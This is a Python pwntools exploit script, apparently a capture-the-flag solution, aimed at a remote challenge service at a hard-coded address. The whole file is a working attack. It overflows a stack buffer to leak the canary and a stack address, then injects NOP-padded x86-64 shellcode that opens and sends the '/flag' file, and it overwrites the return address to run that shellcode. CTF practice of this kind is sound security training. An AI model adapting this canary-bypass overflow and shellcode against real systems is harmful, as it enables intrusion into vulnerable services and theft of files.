from pwn import *

# p = process("dist/chall")
p = remote("137.184.250.54", 7051)
context.arch = 'amd64'

shellcode = asm('''
.global _start
.intel_syntax noprefix
_start:
xor rax, rax
mov al, 0x67
shl rax, 0x20
xor rbx, rbx
mov ebx, 0x616c662f
add rbx, rax
push rbx
xor rax, rax
mov al, 2
mov rdi, rsp
xor rsi, rsi
syscall

xor rdi, rdi
inc rdi
mov rsi, rax
xor rdx, rdx
xor rax, rax
mov al, 0xff
mov r10, rax
xor rax, rax
mov al, 0x28
syscall

xor rax, rax
mov al, 0x3c
syscall
''')

log.info("SHELLCODE SIZE => "+str(len((shellcode))))

payload = b'HEADSHOT'
payload = payload.rjust(104,b'A')
payload += b'\x01'
p.send(payload)
p.recvuntil(b'HEADSHOT\x01')
temp = p.recvline()
canary_leak = u64(b'\x00'+(temp[:7]))
stack_addr = u64(temp[7:13].ljust(8,b'\x00'))
addr = stack_addr - 0x120
log.info("CANARY LEAK => "+hex(canary_leak))
log.info("STACK ADDRESS => "+hex(stack_addr))
log.info("BUFFER ADDRESS => "+hex(addr))

lasst = shellcode
lasst = lasst.rjust(80,b'\x90')
lasst += p32(0x1)
lasst += p32(0x2)
lasst += p32(0x28)
lasst += p32(0x3c)
lasst += b'B'*8
lasst += p64(canary_leak)
lasst += b'C'*8
lasst += p64(addr)

p.send(lasst)
p.interactive()
